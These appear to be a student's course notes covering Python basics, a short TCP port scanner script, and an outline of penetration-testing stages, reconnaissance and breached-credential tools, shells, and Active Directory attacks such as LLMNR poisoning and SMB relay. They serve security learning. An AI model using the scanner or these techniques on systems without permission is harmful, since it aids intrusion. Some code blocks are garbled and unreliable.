Boolean expressions and relational operators are fundamental in controlling the flow of your program by making decisions based on conditions. They are extensively used in if statements, while loops, and other control structures to determine the execution path of your code.

PYTHON

```
#Boolean expressions (True or False)
print("Boolean expressions:")

bool1 = True
bool2 = 3*3 == 9
bool3 = False
bool4 = 3*3 != 9

print(bool1,bool2,bool3,bool4)
print(type(bool1))

bool5 = "True"
print(type(bool5))

nl()

#Relational and Boolean operators
greater_than = 7 > 5
less_than = 5 < 7
greater_than_equal_to = 7 >=7
less_than_equal_to = 7 <= 7

test_and = True and True#True
test_and2 = True and False#False
test_or = True or True#True
test_or2 = True or False#True

test_not = not True#False
```

### Conditional Statements

In Python, conditional statements are used to perform different actions based on certain conditions. They allow you to control the flow of your program by executing specific blocks of code when certain conditions are met. Here's an explanation of conditional statements in Python:

1. if Statement:
2. The `if` statement is the most basic conditional statement. It executes a block of code if a given condition is true. Here's the general syntax:

```
if condition:
    # code to be executed if the condition is true

```

Example:

```
x = 5
if x > 0:
    print("x is positive")

```

In this example, the code inside the `if` block (`print("x is positive")`) will be executed if the condition `x > 0` is true.

1. if-else Statement:
2. The `if-else` statement allows you to specify two different blocks of code—one to be executed if the condition is true and another to be executed if the condition is false. Here's the syntax:

```
if condition:
    # code to be executed if the condition is true
else:
    # code to be executed if the condition is false

```

Example:

```
x = 5
if x > 0:
    print("x is positive")
else:
    print("x is not positive")

```

In this example, if `x` is greater than 0, the first block (`print("x is positive")`) will be executed. Otherwise, the second block (`print("x is not positive")`) will be executed.

1. if-elif-else Statement:
2. The `if-elif-else` statement allows you to check multiple conditions and execute different blocks of code based on those conditions. It provides more than two options for branching. Here's the syntax:

```
if condition1:
    # code to be executed if condition1 is true
elif condition2:
    # code to be executed if condition1 is false and condition2 is true
else:
    # code to be executed if all conditions are false

```

Example:

```
x = 5
if x > 0:
    print("x is positive")
elif x < 0:
    print("x is negative")
else:
    print("x is zero")

```

In this example, if `x` is greater than 0, the first block will be executed. If it is less than 0, the second block will be executed. Otherwise, if none of the conditions are true, the third block will be executed.

Conditional statements allow you to make decisions and control the execution flow of your program based on certain conditions. They are essential for implementing logic and branching in your code.

PYTHON

```
#Conditional Statementsdef drink(money):
	if money >= 2:
		return "You've got yourself a drink!"
	else:
		return "No drink for you!"

print(drink(3))
print(drink(1))

def alcohol(age,money):
	if(age >= 21) and (money >= 5):
		return "We're getting a drink!"
	elif (age >= 21) and (money < 5):
		return "Come back with more money."
	elif (age < 21) and (money >= 5):
		return "Nice try, kid!"
	else:
		return "You're too poor and too young!"

print(alcohol(21,5))
print(alcohol(21,4))
print(alcohol(20,5))
print(alcohol(20,4))
```

### Lists

In Python, a list is a versatile and mutable data structure that can hold a collection of items. It allows you to store multiple values of different data types in a single variable. Here's an explanation of lists in Python:

List Creation:

To create a list, you enclose comma-separated values within square brackets `[ ]`. Here's an example:

```
fruits = ["apple", "banana", "orange"]

```

List Access:

You can access individual elements in a list using indexing. Indexing starts from 0 for the first element and goes up to the length of the list minus one. Here are some examples:

```
print(fruits[0])    # Output: "apple"
print(fruits[2])    # Output: "orange"

```

List Modification:

Lists are mutable, which means you can modify their elements. You can assign new values to specific positions in the list or use methods to modify the list itself. Here are some examples:

```
fruits[1] = "grape"     # Modifying an element
fruits.append("kiwi")   # Adding an element to the end
fruits.remove("apple")  # Removing an element

```

List Operations:

Python provides various operations that can be performed on lists. Some common operations include:

- Concatenation: You can use the `+` operator to concatenate two or more lists.
- Length: The `len()` function returns the number of elements in a list.
- Slicing: You can extract a sublist from a list using slicing.
- Iteration: You can use a loop to iterate over the elements of a list.

Here are some examples:

```
fruits = ["apple", "banana", "orange"]
fruits2 = ["grape", "kiwi"]

combined = fruits + fruits2
print(combined)         # Output: ["apple", "banana", "orange", "grape", "kiwi"]

print(len(fruits))      # Output: 3

sublist = fruits[1:3]
print(sublist)          # Output: ["banana", "orange"]

for fruit in fruits:
    print(fruit)        # Output: "apple", "banana", "orange"

```

Lists are powerful data structures in Python that allow you to store and manipulate collections of items. They are widely used for managing and processing data in various applications.

PYTHON

```
#Lists - Have brackets []
movies = ["When Harry Met Sally", "The Hangover", "The Perks of Being a Wallflower", "The Exorcist"]

print(movies[1])#returns the second item in the list - index / indices
print(movies[0])#returns the first item in the list
print(movies[1:3])#returns the first number given until right before last number given
print(movies[1:4])#returns all
print(movies[1:])#returns everything from number to end of list
print(movies[:1])#everything before 1
print(movies[:2])
print(movies[-1])#grabs last item

print(len(movies))#counts items in list
movies.append("JAWS")
print(movies)#appends to end of list

movies.insert(2, "Hustle")
print(movies)

movies.pop()#removes last item
print(movies)

movies.pop(0)#removes first item
print(movies)

amber_movies = ['Just Go With It', '50 First Dates']
our_favorite_movies = movies + amber_movies
print(our_favorite_movies)

grades = [["Bob", 82], ["Alice", 90], ["Jeff", 73]]
bobs_grade = grades[0][1]
print(bobs_grade)
grades[0][1] = 83
print(bobs_grade)
```

### Tuples

In Python, a tuple is an ordered collection of elements, similar to a list. However, unlike lists, tuples are immutable, meaning their elements cannot be modified once they are created. Here's an explanation of tuples in Python:

Tuple Creation:

To create a tuple, you enclose comma-separated values within parentheses `( )`. Here's an example:

```
fruits = ("apple", "banana", "orange")

```

Tuple Access:

You can access individual elements in a tuple using indexing, similar to lists. Indexing starts from 0 for the first element. Here are some examples:

```
print(fruits[0])    # Output: "apple"
print(fruits[2])    # Output: "orange"

```

Tuple Immutability:

Tuples are immutable, meaning you cannot modify their elements. Once a tuple is created, its values cannot be changed. For example, attempting to assign a new value to an element will result in an error. Here's an example:

```
fruits[1] = "grape"    # This will raise an error

```

Tuple Operations:

Although tuples are immutable, you can perform certain operations on them:

- Concatenation: You can use the `+` operator to concatenate two or more tuples.
- Length: The `len()` function returns the number of elements in a tuple.
- Slicing: You can extract a subtuple from a tuple using slicing.

Here are some examples:

```
fruits = ("apple", "banana", "orange")
fruits2 = ("grape", "kiwi")

combined = fruits + fruits2
print(combined)         # Output: ("apple", "banana", "orange", "grape", "kiwi")

print(len(fruits))      # Output: 3

subtuple = fruits[1:3]
print(subtuple)         # Output: ("banana", "orange")

```

Tuples are useful in situations where you want to store a collection of values that should not be changed. They can be used to group related data elements and can also be used as keys in dictionaries. While tuples are immutable, they offer advantages such as faster performance and protection against unintentional modification.

PYTHON

```
#Tuples - Do not change, ()
grades = ("a", "b", "c", "d", "f")

grades.pop, grades.append won't work - not mutable

print(grades[1])
```

### Looping

In Python, looping allows you to repeat a block of code multiple times. It is a fundamental concept used for iterating over data structures, performing repetitive tasks, and controlling the flow of your program. There are two main types of loops in Python: `for` loops and `while` loops. Here's an explanation of looping in Python:

1. for Loop:
2. The `for` loop is used to iterate over a sequence (such as a list, tuple, string, or range) or any iterable object. It executes a block of code a fixed number of times, based on the elements or items in the sequence. Here's the general syntax:

```
for item in sequence:
    # code to be executed for each item in the sequence

```

Example:

```
fruits = ["apple", "banana", "orange"]
for fruit in fruits:
    print(fruit)

```

In this example, the `for` loop iterates over each item in the `fruits` list, and the block of code inside the loop (`print(fruit)`) is executed for each item. It will output:

```
apple
banana
orange

```

1. while Loop:
2. The `while` loop is used to repeatedly execute a block of code as long as a given condition is true. It continues looping until the condition becomes false. Here's the general syntax:

```
while condition:
    # code to be executed while the condition is true

```

Example:

```
count = 0
while count < 5:
    print(count)
    count += 1

```

In this example, the `while` loop will continue executing the code inside the loop (`print(count)`) as long as the condition `count < 5` is true. It will output:

```
0
1
2
3
4

```

The `break` and `continue` Statements:

Within loops, you can use the `break` statement to exit the loop prematurely and the `continue` statement to skip the current iteration and move to the next one.

Looping provides a powerful mechanism for iterating over data, performing calculations, and controlling program flow. By using loops effectively, you can automate repetitive tasks and process large amounts of data efficiently.

PYTHON

```python
#For loops - start to finish of an iterate
vegetables = ["cucumber", "spinach", "cabbage"]
for x in vegetables:
	print(x)

#While loops - execute as long as true
i = 1

while i < 10:
	print(i)
	i += 1
```

### Advanced Strings

In Python, the `str` (string) data type represents a sequence of characters enclosed within single quotes (' ') or double quotes (" "). Strings in Python are immutable, which means they cannot be changed after they are created. Here are some key points about strings in Python:

Creation:

- Example: `my_string = 'Hello, World!'` or `my_string = "Hello, World!"`

Accessing Characters:

- You can access individual characters within a string using indexing, starting from 0.Example: `print(my_string[0])` would output 'H'.

String Concatenation:

- You can concatenate (join) two or more strings using the `+` operator.Example: `greeting = 'Hello' + ' ' + 'World!'` would result in 'Hello World!'.

String Length:

- The `len()` function can be used to determine the length (number of characters) of a string.Example: `print(len(my_string))` would output the length of the string.

String Slicing:

- You can extract a substring from a string using slicing, specifying the start and end indices.Example: `substring = my_string[7:12]` would extract the substring 'World'.

String Methods:

- Python provides various built-in methods to manipulate and transform strings. Examples include `upper()`, `lower()`, `strip()`, `split()`, `replace()`, and more.Example: `print(my_string.upper())` would output 'HELLO, WORLD!'.

String Formatting:

- String formatting allows you to embed values within a string. This can be done using the `%` operator or the `format()` method.
- Example:

```
name = 'Alice'
age = 30
print("My name is %s and I'm %d years old." % (name, age))
# Output: My name is Alice and I'm 30 years old.

```

These are just a few key concepts related to strings in Python. Strings in Python are versatile and support a wide range of operations and manipulations.

PYTHON

```
#ADVANCED STRINGS

my_name = "Heath"
print(my_name[0])#first letter
print(my_name[-1])#last letter

sentence = "This is a sentence."
print(sentence[:4])

print(sentence.split())#delimeter - default is a space

sentence_split = sentence.split()
sentence_join = ' '.join(sentence_split)
print(sentence_join)

quote = "He said, 'give me all your money'" - show example
quote = "He said, \"give me all your money\""
print(quote)

too_much_space = "                       hello          "
print(too_much_space.strip())

print("A" in "Apple")#returns true
print("a" in "Apple")#returns false - case sensitive

letter = "A"
word = "Apple"
print(letter.lower() in word.lower())#improved

movie = "The Hangover"
print("My favorite movie is {}.".format(movie))
print("My favorite movie is %s" % movie)
print(f"My favorite movie is {movie}")
```

### Dictionaries

In Python, a dictionary is an unordered collection of key-value pairs. It is a versatile and powerful data structure that allows you to store, retrieve, and manipulate data based on unique keys. Here's an explanation of dictionaries in Python:

Dictionary Creation:

To create a dictionary, you enclose key-value pairs within curly braces `{ }`, separating each pair with a colon `:`. Here's an example:

```
student = {
    "name": "Alice",
    "age": 20,
    "major": "Computer Science"
}

```

Dictionary Access:

You can access the values in a dictionary by referring to their corresponding keys. Keys provide a way to uniquely identify and retrieve values. Here's an example:

```
print(student["name"])   # Output: "Alice"
print(student["age"])    # Output: 20

```

Dictionary Modification:

Dictionaries are mutable, which means you can modify their values by assigning new values to specific keys. Here's an example:

```
student["age"] = 21       # Modifying a value
student["city"] = "London"    # Adding a new key-value pair

```

Dictionary Operations:

Python provides various operations that can be performed on dictionaries. Some common operations include:

- Length: The `len()` function returns the number of key-value pairs in a dictionary.
- Iteration: You can iterate over the keys, values, or key-value pairs of a dictionary using loops.
- Deletion: You can remove a key-value pair from a dictionary using the `del` keyword.

Here are some examples:

```
student = {
    "name": "Alice",
    "age": 20,
    "major": "Computer Science"
}

print(len(student))          # Output: 3

for key in student:
    print(key, student[key])  # Output: "name Alice", "age 20", "major Computer Science"

del student["age"]           # Deleting a key-value pair

```

Dictionaries are powerful data structures that provide a flexible way to store and retrieve data based on keys. They are commonly used for organizing and manipulating data that requires quick and efficient access.

PYTHON

```
#DICTIONARIES - key/value pairs {}

drinks = {"White Russian": 7, "Old Fashion": 10, "Lemon Drop": 8}#drink is key, price is value
print(drinks)

employees = {"Finance": ["Bob", "Linda", "Tina"], "IT": ["Gene", "Louise", "Teddy"], "HR": ["Jimmy Jr.", "Mort"]}
employees['Legal'] = ["Mr. Frond"]#adds new key:value pair
print(employees)

employees.update({"Sales": ["Andie", "Ollie"]})#adds new key:value pair
print(employees)

drinks['White Russian'] = 8
print(drinks)

print(drinks.get("White Russian"))
```

### Importing Modules

In Python, importing modules allows you to access and use code that resides in external Python files or libraries. Modules are a way to organize and reuse code, making it easier to manage and maintain large projects. Here's an explanation of importing modules in Python:

1. Importing Entire Modules:
2. To import an entire module, you use the `import` keyword followed by the module name. Here's an example:

```
import math

result = math.sqrt(25)
print(result)   # Output: 5.0

```

In this example, the `math` module is imported, and the `sqrt()` function from the module is used to calculate the square root of 25.

1. Importing Specific Functions or Variables:
2. If you only need to use specific functions or variables from a module, you can import them directly. Here's an example:

```
from math import sqrt

result = sqrt(25)
print(result)   # Output: 5.0

```

In this case, only the `sqrt()` function is imported from the `math` module, so you can use it directly without prefixing it with the module name.

1. Importing Modules with an Alias:
2. You can also import a module and give it an alias using the `as` keyword. This can be helpful when dealing with modules with long names or to avoid naming conflicts. Here's an example:

```
import math as m

result = m.sqrt(25)
print(result)   # Output: 5.0

```

In this example, the `math` module is imported and assigned the alias `m`, so you can use `m.sqrt()` instead of `math.sqrt()`.

1. Importing All Functions and Variables:
2. If you want to import all functions and variables from a module, you can use the `` wildcard character. However, it is generally recommended to import only what you need to avoid namespace pollution. Here's an example:

```
from math import *

result = sqrt(25)
print(result)   # Output: 5.0

```

In this case, all functions and variables from the `math` module are imported directly, allowing you to use them without prefixing with the module name.

Importing modules enables you to access and utilize a wide range of functionality provided by the Python standard library or third-party libraries. It promotes code reusability, modularity, and maintainability in your Python programs.

PYTHON

```
#IMPORTING - Importing is important.import sys#system functions and parametersfrom datetime import datetime as dt#import with alias

print(sys.version)
print(dt.now())
```

### Sockets

In Python, sockets are a fundamental networking concept used for communication between computers over a network. Sockets enable programs to establish connections, send data, and receive data over various network protocols, such as TCP (Transmission Control Protocol) and UDP (User Datagram Protocol). Here's an explanation of sockets in Python:

Socket Creation:

To use sockets in Python, you need to import the `socket` module. You can create a socket object using the `socket.socket()` function, which takes two parameters: the address family (e.g., `socket.AF_INET` for IPv4) and the socket type (e.g., `socket.SOCK_STREAM` for TCP or `socket.SOCK_DGRAM` for UDP). Here's an example:

```
import socket

# Create a TCP socket
tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Create a UDP socket
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

```

Socket Communication:

Once you have a socket object, you can use various methods to establish connections, send data, and receive data. Here are some commonly used methods:

- `socket.connect(address)`: Establishes a connection to a remote address.
- `socket.bind(address)`: Binds the socket to a specific address and port.
- `socket.listen(backlog)`: Listens for incoming connections on a TCP socket.
- `socket.accept()`: Accepts an incoming connection and returns a new socket object for communication.
- `socket.send(data)`: Sends data over the socket.
- `socket.recv(buffer_size)`: Receives data from the socket.

Here's an example of a basic TCP server that listens for incoming connections:

```
import socket

# Create a TCP socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to a specific address and port
server_address = ('localhost', 1234)
server_socket.bind(server_address)

# Listen for incoming connections
server_socket.listen(5)

while True:
    # Accept a client connection
    client_socket, client_address = server_socket.accept()

    # Receive and send data
    data = client_socket.recv(1024)
    client_socket.send(b"Received: " + data)

    # Close the client socket
    client_socket.close()

```

Socket programming in Python allows you to create client-server applications, networked applications, and perform various networking tasks. It provides a powerful and flexible way to communicate over networks using different protocols. The `socket` module in Python provides a wide range of functions and methods to handle network communication efficiently.

PYTHON

```
#SOCKETS - Sockets can be used to connect two nodes together.#!/bin/python3import socket

HOST = '127.0.0.1'
PORT = 7777

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#af_inet is ipv4, sock stream is a port
s.connect((HOST,PORT))
```

### Building a Port Scanner

PYTHON

```python
#!/bin/python3

import sys
import socket
from datetime import datetime

#Define our targetif len(sys.argv) == 2:
	target = socket.gethostbyname(sys.argv[1])#Translate hostname to IPv4else:
	print("Invalid amount of arguments.")
	print("Syntax: python3 scanner.py")

#Add a pretty banner
print("-" * 50)
print("Scanning target "+target)
print("Time started: "+str(datetime.now()))
print("-" * 50)

try:
	for port in range(50,85):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		socket.setdefaulttimeout(1)
		result = s.connect_ex((target,port))#returns an error indicator - if port is open it throws a 0, otherwise 1if result == 0:
			print("Port {} is open".format(port))
		s.close()

except KeyboardInterrupt:
	print("\nExiting program.")
	sys.exit()

except socket.gaierror:
	print("Hostname could not be resolved.")
	sys.exit()

except socket.error:
	print("Could not connect to server.")
	sys.exit()
```

### User Input

In Python, you can interact with the user and receive input using the `input()` function. The `input()` function allows you to prompt the user for input and receive the input as a string. Here's an explanation of user input in Python:

```
name = input("Enter your name: ")
print("Hello, " + name + "!")

```

In this example, the `input()` function is used to prompt the user to enter their name. The message "Enter your name: " is displayed to the user as a prompt. The user can then type their name and press Enter. The input provided by the user is stored in the variable `name`, and the program prints a greeting using the entered name.

The `input()` function always returns the user's input as a string. If you need to convert the input to a different data type, such as an integer or float, you can use appropriate conversion functions like `int()` or `float()`.

```
age = input("Enter your age: ")
age = int(age)  # Convert the input to an integer

print("You will be " + str(age + 1) + " next year.")

```

In this example, the user is asked to enter their age. The input is stored as a string in the variable `age`. To perform arithmetic calculations, the input is converted to an integer using the `int()` function. The program then adds 1 to the age and prints the result.

When using user input, keep in mind that it is a string by default. Ensure proper validation and error handling if you expect specific data types or want to handle invalid input.

User input allows you to make your programs interactive and dynamic by accepting input from users during runtime. It provides a way to customize program behavior based on user responses.

PYTHON

```
#USER INPUT

x = float(input("Give me a number: "))
o = input("Give me an operator: ")
y = float(input("Give me yet another number: "))

if o == "+":
	print(x + y)
elif o == "-":
	print(x - y)
elif o == "/":
	print(x / y)
elif o == "*":
	print(x * y)
elif o == "**":
	print(x ** y)
else:
	print("Unknown operator.")
```

### Reading and Writing Files

In Python, you can read from and write to files using file objects and various methods provided by the built-in `open()` function. Here's an explanation of reading from and writing to files in Python:

Reading Files:

To read from a file, you need to open it in read mode using the `open()` function. Once the file is open, you can use methods like `read()`, `readline()`, or `readlines()` to retrieve the contents of the file.

- `read()`: Reads the entire content of the file as a string.
- `readline()`: Reads a single line from the file.
- `readlines()`: Reads all lines from the file and returns them as a list.

Here's an example of reading from a file:

```
# Open the file in read mode
file = open("example.txt", "r")

# Read the entire content
content = file.read()
print(content)

# Read a single line
line = file.readline()
print(line)

# Read all lines
lines = file.readlines()
print(lines)

# Close the file
file.close()

```

Writing Files:

To write to a file, you need to open it in write mode using the `open()` function. Once the file is open, you can use the `write()` method to write content to the file.

- `write(content)`: Writes the specified content to the file.

Here's an example of writing to a file:

```
# Open the file in write mode
file = open("example.txt", "w")

# Write content to the file
file.write("Hello, World!\n")
file.write("This is a new line.")

# Close the file
file.close()

```

Appending to Files:

To append content to an existing file without overwriting its existing contents, you can open the file in append mode (`"a"`) using the `open()` function. Then, you can use the `write()` method to append content to the file.

```
# Open the file in append mode
file = open("example.txt", "a")

# Append content to the file
file.write("\nThis is appended content.")

# Close the file
file.close()

```

It is generally recommended to use the `with` statement when working with files. This ensures that the file is properly closed even if an exception occurs.

```
with open("example.txt", "r") as file:
    content = file.read()
    print(content)

```

Reading and writing files in Python allows you to handle external data, process large amounts of information, and store program outputs for later use. It is important to properly manage file resources and close them after use to avoid memory leaks and ensure data integrity.

### Classes and Objects

In Python, classes and objects are key components of object-oriented programming (OOP). They provide a way to structure code and define custom data types. Here's an explanation of classes and objects in Python:

Classes:

A class is a blueprint or a template for creating objects. It defines the properties (attributes) and behaviors (methods) that objects of that class will possess. You can think of a class as a blueprint for creating instances of objects with similar characteristics and functionalities. Here's an example of a simple class definition:

```
class Dog:
    def __init__(self, name, age):
        self.name = name
        self.age = age

    def bark(self):
        print("Woof!")

    def display_info(self):
        print("Name:", self.name)
        print("Age:", self.age)

```

In this example, the `Dog` class has attributes `name` and `age`, and methods `bark()` and `display_info()`. The `__init__()` method is a special method known as the constructor, which is called when an object of the class is created.

Objects:

An object is an instance of a class. It is created based on the blueprint provided by the class. Each object has its own set of attributes and can invoke the methods defined in the class. You create objects by calling the class as if it were a function. Here's an example:

```
# Create objects of the Dog class
dog1 = Dog("Buddy", 5)
dog2 = Dog("Max", 3)

# Call methods on the objects
dog1.bark()               # Output: "Woof!"
dog1.display_info()       # Output: "Name: Buddy", "Age: 5"

dog2.bark()               # Output: "Woof!"
dog2.display_info()       # Output: "Name: Max", "Age: 3"

```

In this example, `dog1` and `dog2` are objects created from the `Dog` class. Each object has its own set of attributes (`name` and `age`) and can invoke the methods (`bark()` and `display_info()`) defined in the class.

Classes and objects are essential in object-oriented programming as they provide a way to organize code, encapsulate data, and define reusable entities. They enable you to model real-world entities, create custom data types, and build complex systems by leveraging the principles of inheritance, polymorphism, and encapsulation.

PYTHON

```
class Employees:

	def __init__(self, name, department, role, salary, years_employed):
		self.name = name
		self.department = department
		self.role = role
		self.salary = salary
		self.years_employed = years_employed

	def eligible_for_retirement(self):
		if self.years_employed >= 20:
			return True
		else:
			return False
```

PYTHON

```
from Employees import Employees

e1 = Employees("Bob", "Sales", "Director of Sales", 100000, 20)
e2 = Employees("Linda", "Executive", "CIO", 150000, 10)

print(e1.name)
print(e2.role)
print(e1.eligible_for_retirement())
```

### Building a Shoe Budget Tool

PYTHON

```python
class Shoes:
        def __init__(self, name, price):
                self.name = name
                self.price = float(price)

        def budget_check(self, budget):
                if not isinstance(budget, (int, float)):
                        print('Invalid entry. Please enter a number.')
                        exit()

        def change(self, budget):
                return (budget - self.price)

        def buy(self, budget):
                self.budget_check(budget)

                if budget >= self.price:
                        print(f'You can cop some {self.name}')

                        if budget == self.price:
                                print('You have exactly enough money for these shoes.')
                        else:
                                print(f'You can buy these shoes and have ${self.change(budget)} left over')

                        exit('Thanks for using our shoe budget app!')

```

PYTHON

```
#!/bin/python3from Shoes import Shoes

low = Shoes('And 1s', 30)
medium = Shoes('Air Force 1s', 120)
high = Shoes('Off Whites', 400)

try:
   shoe_budget = float(input('What is your shoe budget? '))
except ValueError:
   exit('Please enter a number')

for shoes in [high, medium, low]:
   shoes.buy(shoe_budget)
```

PYTHON

```
months = open('months.txt')

print(months)
print(months.mode)
print(months.readable())

months.close()

print(months.read())
print(months.readline())#reads one line
print(months.readline())#reads next line
print(months.readlines())#prints an array
print(months.readlines())#prints an empty array because we already read it
months.seek(0)
print(months.readlines()) - prints an array again

months.seek(0)
for month in months:
	print(month)

months.seek(0)
for month in months:
	print(month.strip())

days = open("days.txt", "w")
days.write("Monday")
days.close()

days = open("days.txt", "w")
days.write("\nTuesday") - overwrites
days.close()

days = open("days.txt", "a")
days.write("\nWednesday") - appends
days.close()
```

## The Ethical Hacker Methodology

### The Five Stages of Ethical Hacking

Ethical hacking, also known as penetration testing or white-hat hacking, follows a structured approach to identify and address vulnerabilities in computer systems and networks. The ethical hacking process typically involves the following five stages:

**Reconnaissance:**

The reconnaissance stage involves gathering information about the target system or network. It includes passive information gathering techniques such as searching publicly available information, browsing websites, and examining DNS records. The goal is to collect as much information as possible to understand the target and identify potential entry points.

**Scanning:**

In the scanning stage, the ethical hacker actively probes the target system or network to discover open ports, services, and vulnerabilities. Various tools and techniques are employed, such as port scanning, network mapping, and vulnerability scanning. This stage helps identify potential weaknesses that can be exploited.

**Gaining Access:**

In this stage, the ethical hacker attempts to gain unauthorized access to the target system or network. The focus is on exploiting vulnerabilities discovered during the scanning stage. Techniques such as password cracking, social engineering, and exploiting software vulnerabilities may be employed to gain access to the target system.

**Maintaining Access:**

Once access is gained, the ethical hacker aims to maintain access to the compromised system or network. This stage involves bypassing security mechanisms, setting up backdoors or remote access tools, and establishing persistent access. The objective is to mimic the actions of a real attacker and assess the potential impact of a successful compromise.

**Covering Tracks:**

In the final stage, the ethical hacker removes any traces of their activities from the target system or network. This includes deleting logs, modifying or removing files, and restoring the system to its original state. The goal is to ensure that the ethical hacking activity remains undetected, leaving no evidence of the penetration testing activity behind.

It's important to note that ethical hacking should always be performed with proper authorization and within the bounds of the law. Ethical hackers are responsible for following strict ethical guidelines, maintaining confidentiality, and obtaining necessary permissions from the system or network owners before conducting any penetration testing activities.

## Information Gathering (Reconnaissance)

### Passive Reconnaissance Overview

### Identifying Our Target

### Discovering Email Addresses

hunter.io

phonebook.cz

clearbit

emailhippo

### Gathering Breached Credentials with Breach-Parse

breach parse

### Hunting Breached Credentials with DeHashed

Dehasked

### Hunting Subdomains Part 1

crt.sh

### Hunting Subdomains Part 2

sublister

owasp amass

crt.sh

### Identifying Website Technologies

builtwith

wapalyzer

whatweb

### Information Gathering with Burp Suite

### Google Fu

### Utilizing Social Media

### Additional Learning (OSINT Fundamentals)

## Scanning & Enumeration

### Installing Kioptrix

Kioptrix Download - [https://tcm-sec.com/kioptrix](https://tcm-sec.com/kioptrix)

### Scanning with Nmap

arpscan

netdiscover

### Enumerating HTTP and HTTPS Part 1

nikto

### Enumerating HTTP and HTTPS Part 2

dirbuster

dirb

gobuster

### Enumerating SMB

metasploit

smbclient

### Enumerating SSH

### Researching Potential Vulnerabilities

### Our Notes So Far

## Vulnerability Scanning with Nessus

### Scanning with Nessus Part 1

### Scanning with Nessus Part 2

## Exploitation Basics

### Reverse Shells vs Bind Shells

Reverse Shell is when the attacker is listening and the target connects to attacker.

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled.png)

Bind Shell when target is listening and attacker connects to target.

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%201.png)

### Staged vs Non-Staged Payloads

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%202.png)

### Gaining Root with Metasploit

### Manual Exploitation

### Brute Force Attacks

### Credential Stuffing and Password Spraying

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%203.png)

### Our Notes, Revisited

## **New Capstone**

### [](https://academy.tcm-sec.com/courses/practical-ethical-hacking-the-complete-course/lectures/34117486) Introduction (5:42)

[Capstone VMs](https://drive.google.com/drive/folders/1xJy4ozXaahXvjbgTeJVWyY-eUGIKgCj1?usp=sharing)

[Old Capstone Videos](https://www.youtube.com/watch?v=JZN3JhoAdWo&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB&ab_channel=TheCyberMentor)

[Windows Privilege Escalation for Beginners](https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners)

[Linux Privilege Escalation for Beginners](https://academy.tcm-sec.com/p/linux-privilege-escalation)

**Download**

[**Dev.zip**](https://cdn.fs.teachablecdn.com/XyWGk3BwRMWhth526GV0)

[**Dev.zip**](https://cdn.fs.teachablecdn.com/XyWGk3BwRMWhth526GV0)

gtfobins

## Active Directory Overview

### Active Directory Overview

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%204.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%205.png)

### Physical Active Directory Components

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%206.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%207.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%208.png)

### Logical Active Directory Components

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%209.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2010.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2011.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2012.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2013.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2014.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2015.png)

## AD Lab Building

Ethical Hacking Lessons — Building Free Active Directory Lab in Azure - [https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f](https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f)

## Attacking Active Directory: Initial Attack Vectors

### Introduction

### LLMNR Poisoning Overview

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2016.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2017.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2018.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2019.png)

### Capturing Hashes with Responder

### Cracking Our Captured Hashes

### LLMNR Poisoning Mitigation

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2020.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2021.png)

### SMB Relay Attacks Overview

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2022.png)

![Untitled](Practical%20Ethical%20Hacking%20-%20The%20Complete%20Course%20099c2424551c463cb063dab06f5030f9/Untitled%2023.png)

